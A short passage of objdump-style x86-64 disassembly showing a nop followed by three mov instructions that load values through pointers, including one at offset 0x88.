   140005054:	90                   	nop
   140005055:	48 8b 07             	mov    (%rdi),%rax
   140005058:	48 8b 08             	mov    (%rax),%rcx
   14000505b:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
